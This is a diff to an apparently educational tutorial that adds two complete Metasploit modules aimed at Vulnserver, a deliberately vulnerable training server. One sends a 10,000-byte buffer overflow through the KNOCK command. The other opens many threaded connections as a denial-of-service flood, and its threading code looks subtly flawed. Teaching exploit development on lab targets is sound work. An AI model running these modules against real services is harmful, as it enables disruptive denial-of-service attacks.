@@ -352,6 +352,7 @@ This module is meant to create a certain number of connections to the vulnserver
 
 This results in the following Module:
 ```ruby
+# DDoS
 require 'socket'
 
 class MetasploitModule < Msf::Auxiliary
@@ -447,8 +448,94 @@ def run
     end
 end
 ```
+### End Result 
+These are the end results of making the module body and functions for both the DoS and DDoS modules. They will be slightly different from the code in the repository as they will have the simplified run and helper function.
 
 
+#### DoS End
+```ruby
+# DoS
+class MetasploitModule < Msf::Auxiliary	
+  Rank = NormalRanking	
+
+  include Msf::Exploit::Remote::Tcp	
+  include Msf::Auxiliary::Dos
+
+  def initialize(info = {})	
+    super(update_info(info,
+      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
+      'Description'    => %q{
+         Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
+      },
+      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
+      'License'        => MSF_LICENSE,
+      'References'     =>	
+        [
+          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Mar. 30, 2022'))	
+      register_options([
+      	Opt::RPORT(9999)
+      ])
+  end
+
+  def run
+    connect # This is a function from the Msf::Exploit::Remote:Tcp Mixin that connect to the RHOST, on RPORT
+    outbound = "KNOCK /.:/" + "A"*10000 # Create outbound message
+    sock.put(outbound) # sends message to target
+
+    ensure # Ensures the exploit disconnects from the server
+        disconnect
+    end
+    end
+end
+```
+#### DDoS End
+```ruby
+# DDoS
+require 'socket'
+
+class MetasploitModule < Msf::Auxiliary
+    include Msf::Auxiliary::Dos 
+    Rank = NormalRanking
+
+def initialize(info = {})
+    super(update_info(info, 
+        'Name'           => 'Vulnserver DDoS', 
+        'Description'    => %q{
+            Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
+        },
+        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
+        'License'        => MSF_LICENSE,
+        'References'     =>	
+        [
+            [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
+        ],
+        'Privileged'     => false,
+        'DisclosureDate' => 'Mar. 30, 2022'))	
+        register_options(
+        [
+            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]), 
+            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
+            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
+        ])
+    end
+
+    def threadExploit
+        threadSocket = TCPSocket.new datastore['RHOST'], datastore['RPORT']
+        while(1)
+            threadSocket.gets
+        end
+    end
+
+    def run
+        for x in 1..datastore['ThreadNum'] do
+            Thread.new(threadExploit())
+        end
+    end
+end
+```
 ## References
 1. [Make citation - Metasploit different modules](https://docs.rapid7.com/metasploit/msf-overview/)
 1. [Make citation - Metasploit What is a module](https://docs.rapid7.com/metasploit/modules/#:~:text=A%20module%20is%20a%20piece,%2C%20or%20post%2Dexploitation%20module.)
